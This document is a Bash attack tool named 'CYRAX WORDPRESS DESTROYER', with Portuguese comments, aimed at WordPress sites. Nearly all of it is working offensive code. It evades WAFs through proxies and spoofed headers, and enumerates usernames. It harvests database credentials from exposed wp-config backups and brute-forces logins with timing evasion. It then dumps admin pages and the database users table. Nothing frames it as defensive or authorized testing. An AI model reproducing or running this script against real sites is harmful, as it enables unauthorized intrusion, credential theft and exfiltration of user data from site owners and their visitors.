#!/bin/bash
# CYRAX WORDPRESS DESTROYER - Ferramenta definitiva para WordPress
echo "=== CYRAX WORDPRESS DESTROYER - NO MERCY WP TOOL ==="

TARGET="$1"
MODE="${2:-full}"
THREADS="${3:-15}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL> [MODE] [THREADS]"
    echo "Modos: discovery, exploit, brute, dump, full"
    echo "Exemplo: $0 https://site.com full 20"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/cyrax_wp_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "🧵 Threads: $THREADS"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/wp.log" ;;
        "VULN") echo "⚠️  [$timestamp] $msg" | tee -a "$TEMP_DIR/wp.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/wp.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/wp.log" ;;
    esac
}

# WAF Bypass inteligente
make_waf_request() {
    local url="$1"
    local method="${2:-GET}"
    
    local waf_headers=(
        "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
        "User-Agent: Twitterbot/1.0"
        "User-Agent: LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/)"
    )
    
    local bypass_headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "CF-Connecting-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "X-Cluster-Client-IP: 127.0.0.1"
    )
    
    for ua in "${waf_headers[@]}"; do
        for bypass in "${bypass_headers[@]}"; do
            local response=$(proxychains4 -q curl -s -m 15 -H "$ua" -H "$bypass" "$url" 2>/dev/null)
            if [ -n "$response" ] && ! echo "$response" | grep -qi "blocked\|forbidden\|access denied\|rate limit"; then
                echo "$response"
                return 0
            fi
            sleep 0.5
        done
    done
    return 1
}

# Descoberta WordPress ultra avançada
wp_discovery() {
    log "INFO" "Iniciando descoberta CYRAX do WordPress"
    
    # Verificar se é WordPress
    local wp_indicators=(
        "/wp-content/"
        "/wp-includes/"
        "/wp-admin/"
        "wp-json"
        "xmlrpc.php"
        "wp-login.php"
        "wp-config.php"
        "/wp-"
        "wordpress"
        "wp_"
    )
    
    log "INFO" "Verificando indicadores WordPress"
    local content=$(make_waf_request "$TARGET")
    
    local is_wordpress=false
    for indicator in "${wp_indicators[@]}"; do
        if echo "$content" | grep -qi "$indicator"; then
            log "SUCCESS" "WordPress detectado: $indicator"
            echo "$indicator" >> "$TEMP_DIR/wp_indicators.txt"
            is_wordpress=true
        fi
    done
    
    if [ "$is_wordpress" = false ]; then
        log "INFO" "WordPress não detectado diretamente, testando endpoints"
        
        # Testar endpoints WordPress comuns
        local wp_endpoints=(
            "/wp-admin/"
            "/wp-login.php"
            "/wp-content/"
            "/wp-includes/"
            "/xmlrpc.php"
            "/wp-json/"
            "/wp-json/wp/v2/"
            "/wp-sitemap.xml"
            "/robots.txt"
            "/readme.html"
            "/license.txt"
        )
        
        for endpoint in "${wp_endpoints[@]}"; do
            local test_url="$TARGET$endpoint"
            local response=$(make_waf_request "$test_url")
            local status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)
            
            if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
                log "SUCCESS" "Endpoint WordPress encontrado: $endpoint (HTTP $status)"
                echo "$endpoint:$status" >> "$TEMP_DIR/wp_endpoints.txt"
                is_wordpress=true
            fi
        done
    fi
    
    if [ "$is_wordpress" = false ]; then
        log "INFO" "WordPress não detectado, saindo..."
        return 1
    fi
    
    # Detectar versão WordPress
    log "INFO" "Detectando versão WordPress"
    
    # Métodos para detectar versão
    local version_sources=(
        "$TARGET/wp-includes/js/wp-emoji-release.min.js"
        "$TARGET/wp-admin/js/common.min.js"
        "$TARGET/wp-includes/css/dashicons.min.css"
        "$TARGET/readme.html"
        "$TARGET/wp-json/"
    )
    
    for source in "${version_sources[@]}"; do
        local version_content=$(make_waf_request "$source")
        
        # Extrair versão de diferentes formas
        local version=$(echo "$version_content" | grep -oP 'ver=\K[0-9]+\.[0-9]+\.[0-9]+' | head -1)
        [ -z "$version" ] && version=$(echo "$version_content" | grep -oP 'version":\s*"\K[0-9]+\.[0-9]+\.[0-9]+' | head -1)
        [ -z "$version" ] && version=$(echo "$version_content" | grep -oP 'WordPress\s+\K[0-9]+\.[0-9]+\.[0-9]+' | head -1)
        
        if [ -n "$version" ]; then
            log "SUCCESS" "Versão WordPress detectada: $version"
            echo "$version" > "$TEMP_DIR/wp_version.txt"
            break
        fi
    done
    
    # Enumerar usuários WordPress
    log "INFO" "Enumerando usuários WordPress"
    
    # Método 1: wp-json API
    local users_json=$(make_waf_request "$TARGET/wp-json/wp/v2/users")
    if [ -n "$users_json" ] && echo "$users_json" | grep -q "slug"; then
        log "SUCCESS" "Usuários encontrados via wp-json API"
        echo "$users_json" > "$TEMP_DIR/wp_users_json.txt"
        
        # Extrair usernames
        echo "$users_json" | jq -r '.[].slug' 2>/dev/null > "$TEMP_DIR/wp_usernames.txt"
    fi
    
    # Método 2: Author enumeration
    log "INFO" "Enumeração por author ID"
    for i in {1..20}; do
        local author_url="$TARGET/?author=$i"
        local author_response=$(make_waf_request "$author_url")
        
        if [ -n "$author_response" ]; then
            local username=$(echo "$author_response" | grep -oP 'author/\K[^/"]+' | head -1)
            if [ -n "$username" ]; then
                log "SUCCESS" "Usuário encontrado: $username (ID: $i)"
                echo "$username" >> "$TEMP_DIR/wp_usernames.txt"
            fi
        fi
        sleep 0.5
    done
    
    # Método 3: Login error enumeration
    log "INFO" "Enumeração via login errors"
    local common_users=("admin" "administrator" "user" "test" "demo" "guest" "root" "wp" "wordpress")
    
    for user in "${common_users[@]}"; do
        local login_data="log=$user&pwd=wrongpassword123&wp-submit=Log+In"
        local login_response=$(proxychains4 -q curl -s -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "$login_data" \
            "$TARGET/wp-login.php" 2>/dev/null)
        
        if echo "$login_response" | grep -qi "incorrect.*password"; then
            log "SUCCESS" "Usuário válido encontrado: $user"
            echo "$user" >> "$TEMP_DIR/wp_usernames.txt"
        elif echo "$login_response" | grep -qi "invalid.*username"; then
            log "INFO" "Usuário inválido: $user"
        fi
        sleep 1
    done
    
    # Remover duplicatas
    if [ -f "$TEMP_DIR/wp_usernames.txt" ]; then
        sort -u "$TEMP_DIR/wp_usernames.txt" -o "$TEMP_DIR/wp_usernames.txt"
        local user_count=$(wc -l < "$TEMP_DIR/wp_usernames.txt")
        log "SUCCESS" "Total de usuários únicos encontrados: $user_count"
    fi
}

# Exploração WordPress
wp_exploitation() {
    log "INFO" "Iniciando exploração WordPress"
    
    # Testar xmlrpc.php
    log "INFO" "Testando xmlrpc.php"
    local xmlrpc_test=$(make_waf_request "$TARGET/xmlrpc.php")
    
    if echo "$xmlrpc_test" | grep -qi "xml-rpc"; then
        log "SUCCESS" "xmlrpc.php ativo"
        echo "XMLRPC_ACTIVE" >> "$TEMP_DIR/wp_vulns.txt"
        
        # Testar métodos xmlrpc
        local xmlrpc_methods='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        local methods_response=$(proxychains4 -q curl -s -X POST \
            -H "Content-Type: text/xml" \
            -d "$xmlrpc_methods" \
            "$TARGET/xmlrpc.php" 2>/dev/null)
        
        if [ -n "$methods_response" ]; then
            log "SUCCESS" "Métodos xmlrpc obtidos"
            echo "$methods_response" > "$TEMP_DIR/xmlrpc_methods.txt"
            
            # Verificar métodos perigosos
            if echo "$methods_response" | grep -qi "pingback\|wp.getUsersBlogs"; then
                log "CRITICAL" "Métodos xmlrpc perigosos disponíveis!"
                echo "XMLRPC_DANGEROUS_METHODS" >> "$TEMP_DIR/wp_vulns.txt"
            fi
        fi
    fi
    
    # Testar wp-config.php backups
    log "INFO" "Procurando backups wp-config.php"
    local config_backups=(
        "/wp-config.php.bak"
        "/wp-config.php~"
        "/wp-config.php.old"
        "/wp-config.php.orig"
        "/wp-config.php.save"
        "/wp-config.txt"
        "/wp-config.php.1"
        "/.wp-config.php.swp"
        "/wp-config.php.backup"
    )
    
    for backup in "${config_backups[@]}"; do
        local backup_url="$TARGET$backup"
        local backup_content=$(make_waf_request "$backup_url")
        
        if echo "$backup_content" | grep -qi "DB_PASSWORD\|DB_USER\|DB_HOST"; then
            log "CRITICAL" "wp-config.php backup encontrado: $backup"
            echo "CONFIG_BACKUP:$backup" >> "$TEMP_DIR/wp_vulns.txt"
            echo "$backup_content" > "$TEMP_DIR/wp_config_backup.txt"
            
            # Extrair credenciais do banco
            local db_name=$(echo "$backup_content" | grep -oP "DB_NAME['\"],\s*['\"]\\K[^'\"]+")
            local db_user=$(echo "$backup_content" | grep -oP "DB_USER['\"],\s*['\"]\\K[^'\"]+")
            local db_pass=$(echo "$backup_content" | grep -oP "DB_PASSWORD['\"],\s*['\"]\\K[^'\"]+")
            local db_host=$(echo "$backup_content" | grep -oP "DB_HOST['\"],\s*['\"]\\K[^'\"]+")
            
            if [ -n "$db_user" ]; then
                log "CRITICAL" "Credenciais DB: $db_user:$db_pass@$db_host/$db_name"
                echo "$db_user:$db_pass:$db_host:$db_name" > "$TEMP_DIR/wp_db_creds.txt"
            fi
        fi
    done
    
    # Testar uploads directory
    log "INFO" "Testando diretório uploads"
    local uploads_response=$(make_waf_request "$TARGET/wp-content/uploads/")
    
    if echo "$uploads_response" | grep -qi "index of\|directory listing"; then
        log "VULN" "Directory listing ativo em uploads"
        echo "UPLOADS_LISTING" >> "$TEMP_DIR/wp_vulns.txt"
    fi
    
    # Procurar plugins vulneráveis
    log "INFO" "Enumerando plugins WordPress"
    
    # Lista de plugins comuns vulneráveis
    local common_plugins=(
        "akismet" "jetpack" "yoast" "elementor" "woocommerce" "contact-form-7"
        "wordfence" "updraftplus" "wp-super-cache" "all-in-one-wp-migration"
        "really-simple-ssl" "wp-optimize" "duplicate-post" "classic-editor"
        "loginizer" "wp-file-manager" "file-manager" "wp-reset" "backup"
        "revslider" "layerslider" "slider-revolution" "ultimate-member"
        "mailchimp" "ninja-forms" "gravity-forms" "wpforms" "caldera-forms"
    )
    
    for plugin in "${common_plugins[@]}"; do
        local plugin_url="$TARGET/wp-content/plugins/$plugin/"
        local plugin_response=$(make_waf_request "$plugin_url")
        local status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$plugin_url" 2>/dev/null)
        
        if [ "$status" = "200" ] || [ "$status" = "403" ]; then
            log "SUCCESS" "Plugin encontrado: $plugin"
            echo "$plugin" >> "$TEMP_DIR/wp_plugins.txt"
            
            # Tentar obter versão do plugin
            local readme_url="$TARGET/wp-content/plugins/$plugin/readme.txt"
            local readme_content=$(make_waf_request "$readme_url")
            
            if [ -n "$readme_content" ]; then
                local plugin_version=$(echo "$readme_content" | grep -oP "Stable tag:\s*\\K[0-9.]+")
                if [ -n "$plugin_version" ]; then
                    log "INFO" "Plugin $plugin versão: $plugin_version"
                    echo "$plugin:$plugin_version" >> "$TEMP_DIR/wp_plugins_versions.txt"
                fi
            fi
        fi
        sleep 0.3
    done
    
    # Testar temas vulneráveis
    log "INFO" "Enumerando temas WordPress"
    
    local common_themes=(
        "twentytwentyone" "twentytwenty" "twentynineteen" "twentyseventeen"
        "astra" "oceanwp" "generatepress" "neve" "hestia" "storefront"
        "customify" "zakra" "kadence" "blocksy" "hello-elementor"
    )
    
    for theme in "${common_themes[@]}"; do
        local theme_url="$TARGET/wp-content/themes/$theme/"
        local status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$theme_url" 2>/dev/null)
        
        if [ "$status" = "200" ] || [ "$status" = "403" ]; then
            log "SUCCESS" "Tema encontrado: $theme"
            echo "$theme" >> "$TEMP_DIR/wp_themes.txt"
        fi
        sleep 0.3
    done
}

# Brute force WordPress inteligente
wp_brute_force() {
    log "INFO" "Iniciando brute force WordPress"
    
    if [ ! -f "$TEMP_DIR/wp_usernames.txt" ]; then
        log "INFO" "Nenhum usuário encontrado, usando lista padrão"
        echo -e "admin\nadministrator\nuser\ntest\ndemo" > "$TEMP_DIR/wp_usernames.txt"
    fi
    
    # Wordlist inteligente baseada no site
    local domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d'.' -f1)
    
    # Gerar wordlist personalizada
    cat > "$TEMP_DIR/wp_passwords.txt" <<EOF
admin
password
123456
$domain
${domain}123
${domain}2024
admin123
password123
qwerty
letmein
welcome
login
pass
test
demo
guest
root
toor
changeme
default
secret
master
system
EOF
    
    # Adicionar variações do ano
    local current_year=$(date +%Y)
    for year in $current_year $((current_year-1)) $((current_year-2)); do
        echo "$domain$year" >> "$TEMP_DIR/wp_passwords.txt"
        echo "admin$year" >> "$TEMP_DIR/wp_passwords.txt"
        echo "password$year" >> "$TEMP_DIR/wp_passwords.txt"
    done
    
    log "INFO" "Iniciando brute force com evasão anti-detecção"
    
    # Função de brute force com evasão
    wp_brute_user() {
        local username="$1"
        local password_file="$2"
        
        while IFS= read -r password; do
            log "INFO" "Testando $username:$password"
            
            # Usar diferentes User-Agents para evasão
            local user_agents=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            )
            local ua="${user_agents[$RANDOM % ${#user_agents[@]}]}"
            
            # Dados do login
            local login_data="log=$username&pwd=$password&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/&testcookie=1"
            
            # Fazer request com evasão
            local login_response=$(proxychains4 -q curl -s -X POST \
                -H "User-Agent: $ua" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Referer: $TARGET/wp-login.php" \
                -b "wordpress_test_cookie=WP+Cookie+check" \
                -c "$TEMP_DIR/cookies_$username.txt" \
                -d "$login_data" \
                "$TARGET/wp-login.php" 2>/dev/null)
            
            # Verificar sucesso
            if echo "$login_response" | grep -qi "dashboard\|wp-admin" && ! echo "$login_response" | grep -qi "error\|incorrect"; then
                log "CRITICAL" "LOGIN SUCESSO: $username:$password"
                echo "$username:$password" >> "$TEMP_DIR/wp_valid_creds.txt"
                
                # Testar acesso admin
                local admin_test=$(proxychains4 -q curl -s \
                    -H "User-Agent: $ua" \
                    -b "$TEMP_DIR/cookies_$username.txt" \
                    "$TARGET/wp-admin/" 2>/dev/null)
                
                if echo "$admin_test" | grep -qi "dashboard"; then
                    log "CRITICAL" "ACESSO ADMIN CONFIRMADO: $username"
                    echo "$username:ADMIN_ACCESS" >> "$TEMP_DIR/wp_admin_access.txt"
                fi
                
                return 0
            fi
            
            # Delay inteligente para evasão
            sleep $((RANDOM % 5 + 2))
            
        done < "$password_file"
        
        return 1
    }
    
    # Executar brute force para cada usuário
    while IFS= read -r username; do
        if [ -n "$username" ]; then
            log "INFO" "Iniciando brute force para usuário: $username"
            wp_brute_user "$username" "$TEMP_DIR/wp_passwords.txt" &
            
            # Controlar número de processos paralelos
            if (( $(jobs -r | wc -l) >= 3 )); then
                wait -n
            fi
        fi
    done < "$TEMP_DIR/wp_usernames.txt"
    
    wait  # Aguardar todos os processos
}

# Dump de dados WordPress
wp_dump() {
    log "INFO" "Iniciando dump de dados WordPress"
    
    # Se temos credenciais válidas, fazer dump via admin
    if [ -f "$TEMP_DIR/wp_valid_creds.txt" ]; then
        while IFS=: read -r username password; do
            log "INFO" "Fazendo dump com credenciais: $username"
            
            # Login e obter cookies
            local login_data="log=$username&pwd=$password&wp-submit=Log+In"
            proxychains4 -q curl -s -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "$login_data" \
                -c "$TEMP_DIR/admin_cookies.txt" \
                "$TARGET/wp-login.php" >/dev/null 2>&1
            
            # Dump de usuários via admin
            local users_dump=$(proxychains4 -q curl -s \
                -b "$TEMP_DIR/admin_cookies.txt" \
                "$TARGET/wp-admin/users.php" 2>/dev/null)
            
            if [ -n "$users_dump" ]; then
                log "SUCCESS" "Dump de usuários obtido"
                echo "$users_dump" > "$TEMP_DIR/wp_users_dump.html"
            fi
            
            # Dump de plugins via admin
            local plugins_dump=$(proxychains4 -q curl -s \
                -b "$TEMP_DIR/admin_cookies.txt" \
                "$TARGET/wp-admin/plugins.php" 2>/dev/null)
            
            if [ -n "$plugins_dump" ]; then
                log "SUCCESS" "Dump de plugins obtido"
                echo "$plugins_dump" > "$TEMP_DIR/wp_plugins_dump.html"
            fi
            
            break  # Usar apenas a primeira credencial válida
        done < "$TEMP_DIR/wp_valid_creds.txt"
    fi
    
    # Se temos credenciais do banco, fazer dump direto
    if [ -f "$TEMP_DIR/wp_db_creds.txt" ]; then
        while IFS=: read -r db_user db_pass db_host db_name; do
            log "INFO" "Tentando dump direto do banco: $db_name"
            
            # Testar conexão MySQL
            local mysql_test=$(timeout 15 proxychains4 -q mysql -h "$db_host" -u "$db_user" -p"$db_pass" -D "$db_name" -e "SHOW TABLES;" 2>/dev/null)
            
            if [ -n "$mysql_test" ]; then
                log "CRITICAL" "Acesso direto ao banco confirmado!"
                echo "$mysql_test" > "$TEMP_DIR/wp_db_tables.txt"
                
                # Dump da tabela de usuários
                local users_table=$(echo "$mysql_test" | grep -i "users" | head -1)
                if [ -n "$users_table" ]; then
                    local users_dump=$(timeout 30 proxychains4 -q mysql -h "$db_host" -u "$db_user" -p"$db_pass" -D "$db_name" -e "SELECT * FROM $users_table;" 2>/dev/null)
                    
                    if [ -n "$users_dump" ]; then
                        log "CRITICAL" "Dump de usuários do banco obtido!"
                        echo "$users_dump" > "$TEMP_DIR/wp_db_users_dump.txt"
                    fi
                fi
            fi
            
            break
        done < "$TEMP_DIR/wp_db_creds.txt"
    fi
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/CYRAX_WORDPRESS_REPORT.md"
    
    cat > "$report_file" <<EOF
# CYRAX WORDPRESS DESTROYER - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Threads:** $THREADS  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Contar descobertas
    local users_count=0
    local plugins_count=0
    local themes_count=0
    local vulns_count=0
    local creds_count=0
    
    [ -f "$TEMP_DIR/wp_usernames.txt" ] && users_count=$(wc -l < "$TEMP_DIR/wp_usernames.txt")
    [ -f "$TEMP_DIR/wp_plugins.txt" ] && plugins_count=$(wc -l < "$TEMP_DIR/wp_plugins.txt")
    [ -f "$TEMP_DIR/wp_themes.txt" ] && themes_count=$(wc -l < "$TEMP_DIR/wp_themes.txt")
    [ -f "$TEMP_DIR/wp_vulns.txt" ] && vulns_count=$(wc -l < "$TEMP_DIR/wp_vulns.txt")
    [ -f "$TEMP_DIR/wp_valid_creds.txt" ] && creds_count=$(wc -l < "$TEMP_DIR/wp_valid_creds.txt")
    
    echo "- **Usuários encontrados:** $users_count" >> "$report_file"
    echo "- **Plugins detectados:** $plugins_count" >> "$report_file"
    echo "- **Temas detectados:** $themes_count" >> "$report_file"
    echo "- **Vulnerabilidades:** $vulns_count" >> "$report_file"
    echo "- **Credenciais válidas:** $creds_count" >> "$report_file"
    
    # Adicionar detalhes se houver descobertas críticas
    if [ $creds_count -gt 0 ]; then
        echo -e "\n## 🔥 CREDENCIAIS VÁLIDAS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/wp_valid_creds.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    if [ $vulns_count -gt 0 ]; then
        echo -e "\n## ⚠️ VULNERABILIDADES" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/wp_vulns.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    if [ -f "$TEMP_DIR/wp_version.txt" ]; then
        echo -e "\n## 📋 VERSÃO WORDPRESS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/wp_version.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "👥 Usuários: $users_count"
    echo "🔌 Plugins: $plugins_count"
    echo "🎨 Temas: $themes_count"
    echo "⚠️  Vulnerabilidades: $vulns_count"
    echo "🔑 Credenciais: $creds_count"
    
    if [ $creds_count -gt 0 ] || [ $vulns_count -gt 0 ]; then
        echo -e "\n🔥 WORDPRESS COMPROMETIDO!"
    fi
}

# Execução principal baseada no modo
case "$MODE" in
    "discovery")
        wp_discovery
        ;;
    "exploit")
        wp_discovery
        wp_exploitation
        ;;
    "brute")
        wp_discovery
        wp_brute_force
        ;;
    "dump")
        wp_discovery
        wp_exploitation
        wp_brute_force
        wp_dump
        ;;
    "full")
        wp_discovery
        wp_exploitation
        wp_brute_force
        wp_dump
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ CYRAX WORDPRESS DESTROYER CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"